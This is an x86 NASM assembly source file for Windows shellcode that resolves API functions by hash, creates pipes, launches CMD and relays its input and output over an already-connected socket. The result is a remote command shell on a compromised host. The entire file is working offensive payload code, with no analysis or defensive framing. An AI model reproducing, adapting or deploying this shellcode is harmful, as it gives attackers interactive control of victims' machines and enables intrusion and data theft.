BITS 32

%include "_kernel32_init.asm"

push "32"
push "WS2_"
push edi                          ; save socket

; initalize kernel32 stuffs..
KERNEL32_INIT

; ebx = kernel32.dll base
; esi = LGetProcAddress
; edi = LoadLibraryA

; eh, so much for ordinals, eh?

DIRECTION_CLD
push ebx
push esi
push edi

lea eax, [esp + 16]               ; ws2_32 ptr
push eax
call edi                          ; LoadLibraryA("ws2_32")
push eax
push eax
push eax
HASH push, 'recv'                 ; recv
call esi                          ; LGetProcAddress('recv', "ws2_32")
xchg eax, edi                     ; save recv in edi
HASH push, 'send'                 ; send
call esi                          ; LGetProcAddress('send', "ws2_32")
xchg eax, ebp                     ; save send in ebp
HASH push, 'ioctlsocket'          ; ioctlsocket
call esi                          ; LGetProcAddress('ioctlsocket', "ws2_32")
push eax                          ; push ioctlsocket
push edi                          ; push recv
push ebp                          ; push send

sub esp, 16                       ; make room for handles
                                  ; pipe1 write, pipe1 read, pipe2 write, read
mov ebp, esp

%define DATA_FIONBIO   0x8004667e
%define DATA_FIONREAD  0x4004667f

%define DATA_SOCKET    [ebp + 40]
%define DATA_KBASE     [ebp + 36]
%define FN_GETPROC     [ebp + 32]
%define FN_LOADLIB     [ebp + 28]
%define FN_IOCTLSOCKET [ebp + 24]
%define FN_RECV        [ebp + 20]
%define FN_SEND        [ebp + 16]
; [ebp + 40] = socket
; [ebp + 36] = kernel32.dll base
; [ebp + 32] = LGetProcAddress
; [ebp + 28] = LoadLibraryA
; [ebp + 24] = ioctlsocket
; [ebp + 20] = recv
; [ebp + 16] = send
; [ebp + 12] = Pipe2 ReadHandle
; [ebp +  8] = Pipe2 WriteHandle
; [ebp +  4] = Pipe1 ReadHandle
; [ebp +  0] = Pipe2 WriteHandle

mov esi, ebp

push BYTE 0x01                    ; inheritable
push BYTE 0x00                    ; null SecurityDescriptor
push BYTE 12                      ; length (12)
mov ecx, esp                      ; PipeAttributes ptr

make_pipe1:
  push BYTE 0x00                    ; buffer size (0, default)
  push ecx                          ; PipeAttributes
;  lea esi, [ebp + 0]
  push esi                          ; pipe1 WriteHandle
  lodsd
;  lea esi, [ebp + 4]
  push esi                          ; pipe1 ReadHandle
;  lodsd
  
  push ebx                          ; push kernel32 base
  HASH push, 'CreatePipe'           ; push hash
  call FN_GETPROC                   ; LGetProcAddress('CreatePipe', kernel32)
  mov edi, eax                      ; save CreatePipe
  call eax                          ; CreatePipe()

make_pipe2:
  mov eax, esp                      ; PipeAttributes ptr
  push BYTE 0x00                    ; BufferSize
  push eax                          ; PipeAttributes
  lea esi, [ebp + 8]
  push esi                          ; pipe2 WriteHandle
;  lodsd
  lea esi, [ebp + 12]
  push esi                          ; pipe2 ReadHandle
  
  call edi                          ; CreatePipe()


; stole HD code
LSetCommand:
  push "CMD"
  mov edx, esp
  
LCreateProcessStructs:
  xor eax,eax         ; overwrite with null
  lea edi, [edx-84]   ; struct sizes
  push byte 21        ; 21 * 4 = 84
  pop ecx             ; set counter

LBZero:
  rep stosd           ; overwrite with null
      
LCreateStructs:
  sub esp, 84
  mov byte [edx - 84 + 16], 68	    ; si.cb = sizeof(si) 
  mov word [edx - 84 + 60], 0x0101 ; si.dwflags

;  DIRECTION_STD                     ; switch direction
;  lodsd                             ; esi = pipe2 WriteHandle
    
  ; socket handles
  mov esi, [ebp + 8]
  mov [edx - 84 + 16 + 64], esi          ; pipe2 stderr
  mov [edx - 84 + 16 + 60], esi          ; pipe2 stdout
; lodsd                                  ; at pipe1 ReadHandle
  mov esi, [ebp + 4]
  mov [edx - 84 + 16 + 56], esi          ; pipe1 stdin

;  DIRECTION_CLD

  lea eax, [edx - 84 + 16] ; si 
  push esp                 ; pi 
  push eax
  push ecx
  push ecx
  push ecx

  inc ecx
  push ecx
  dec ecx
    
  push ecx
  push ecx
  push edx
  push ecx
  
LCreateProcessA:
  push ebx                        ; kernel32 base
  HASH push, 'CreateProcessA'     ; CreateProcessA
  call FN_GETPROC
  call eax                        ; CreateProcessA()

make_buffer:
  xor eax, eax                    ; arggggg
  mov ah, 0x04                    ; 1024 + 0 = 1024
  xchg eax, esi                   ; save length into esi
  sub esp, esi                    ; make buffer space
  mov edi, esp

piper_loop:

piper_sleep:
  push BYTE 100                   ; 100 ms
  push ebx                        ; kernel32 base
  HASH push, 'Sleep'              ; Sleep
  call FN_GETPROC                 ; LGetProcAddress
  call eax                        ; Sleep()

; stdout -> send

peek_stdout:                      ; PeekNamedPipe on stdout
  xor eax, eax
  push eax                        ; bytesLeftThisMessage
  push edi                        ; bytesAvail (use the buffer space)
  push eax                        ; bytesRead
  push eax                        ; bufferSize
  push eax                        ; buffer
  push DWORD [ebp + 12]           ; Pipe2 ReadHandle

  push ebx                        ; kernel32 base
  HASH push, 'PeekNamedPipe'      ; PeekNamedPipe
  call FN_GETPROC                 ; LGetProcAddress
  call eax                        ; PeekNamedPipe()

  test eax, eax
  jz exit_process
  xor eax, eax
  cmp eax, [edi]                  ; numAvail == 0
  je recv_client

set_blocking:
                                  ; zero = blocking
  call call_fionbio
                                  ; zero back in eax

read_stdout:                      ; read on pipe2
  push eax                        ; make room for numRead
  mov ecx, esp                    ; numRead ptr
  push eax                        ; lpOverlapped (0)
  push ecx                        ; numRead
  push esi                        ; numToRead
  push edi                        ; buffer
  push DWORD [ebp + 12]           ; Pipe2 ReadHandle
  push ebx                        ; kernel32 base
  HASH push, 'ReadFile'           ; ReadFile
  call FN_GETPROC                 ; LGetProcAddress
  call eax                        ; ReadFile()
  test eax, eax
  jz exit_process                 ; bummer.
  xor eax, eax
  pop ecx                         ; get numRead
  cmp eax, ecx                    ; no data
  je recv_client

send_client:
  push eax                        ; flags
  push ecx                        ; len
  push edi                        ; buffer
  push DWORD DATA_SOCKET          ; socket
  call FN_SEND                    ; send()
  xor ecx, ecx
  cmp eax, ecx
  jl exit_process                 ; SOCKET_ERROR
  jmp peek_stdout                 ; loop around again, skip sleep

; recv -> stdin

recv_client:
set_nonblocking:
  mov eax, esp                    ; non-zero non-blocking
  call call_fionbio
  xor eax, eax                    ; don't care about return value

call_recv_client:
  push eax                        ; flags
  push esi                        ; len
  push edi                        ; buffer
  push DWORD DATA_SOCKET          ; socket
  call FN_RECV                    ; recv()
  xor ecx, ecx
  cmp eax, ecx
  jl piper_loop                   ; SOCKET_ERROR
  jz exit_process

;  jnl write_stdin                 ; SOCKET_ERROR
  ; XXX fix recv SOCKET_ERROR !

write_stdin:
  push ecx                        ; make room for bytesWritten
  mov edx, esp                    ; ptr to bytesWritten
  push ecx                        ; lpOverlapped (0)
  push edx                        ; bytesWritten
  push eax                        ; bytesToWrite
  push edi                        ; buffer
  push DWORD [ebp + 0]            ; pipe1 write

  push ebx                        ; kernel32 base
  HASH push, 'WriteFile'          ; WriteFile
  call FN_GETPROC                 ; LGetProcAddress
  call eax                        ; WriteFile()

  test eax, eax
  jz exit_process                 ; bummer.
  xor eax, eax
  pop ecx                         ; get numWritten
; what do we do on short write?....
;  cmp eax, ecx                    ; no data
;  je recv_client

  jmp recv_client                  ; if we had data, try to recv again


exit_process:
  push ebx                        ; kernel32 base
  HASH push, 'ExitProcess'        ; ExitProcess
  call FN_GETPROC                 ; LGetProcAddress
  xor ecx, ecx
  push ecx
  call eax                        ; ExitProcess(0)

; pass what you want in eax
; returns value of argp in eax
call_fionbio:
  push eax                        ; argp
  push esp                        ; argp ptr
  push DATA_FIONBIO               ; cmd
  push DWORD DATA_SOCKET          ; socket
  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
  test eax, eax
  pop eax                         ; get len
  jnz exit_process                ; ioctl error
  ret
